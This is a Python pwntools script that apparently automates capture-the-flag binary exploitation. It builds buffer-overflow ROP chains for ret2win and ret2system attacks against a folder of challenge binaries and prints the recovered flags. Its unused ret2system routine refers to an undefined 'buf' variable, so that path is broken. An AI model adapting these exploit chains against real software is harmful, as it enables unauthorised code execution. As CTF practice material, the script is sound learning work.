import os, sys
from pwn import *
from fart import *
from time import sleep
logging.getLogger('pwnlib').setLevel(logging.WARNING)

def main():
    path = 'bins3/'
    for binary in os.listdir(path):
        binary = path + binary 
        print(binary+":")
        
        f_anal = analyze(binary)
        f_rop = our_rop(f_anal)

        #if f_anal.has_system():
        #    ret2system(f_anal)
        if f_anal.has_win():
            ret2win(f_rop)


def ret2system(f_anal):
    binary = f_anal.binary
    get_rop = our_rop(f_anal)

    e = ELF(binary)
    r = ROP(e)

    chain = b'A' * get_rop.ss()
    
    chain += get_rop.fill_reg('rdi', f_anal.get_catflagtxt())
    chain += get_rop.fill_reg('rsi', 0)
    
    chain += p64(e.sym['system'])



    io = process(binary)
    io.sendline(buf + chain)
    io.recvuntil(b'flag')
    print("flag" + io.recvuntil(b'}').decode('utf-8'))
def ret2win(f_rop):
    binary = f_rop.analyze.binary
    chain = b'A' * f_rop.ss()
    
    if f_rop.analyze.win_has_args():
        chain += f_rop.satisfy_win()
        chain += f_rop.realighn()
        chain += p64(f_rop.analyze.get_win())

        io = process(binary)
        io.sendline(chain)
        io.recvuntil(b'flag')
        print('flag' + io.recvuntil(b'}').decode('utf-8'))


main()
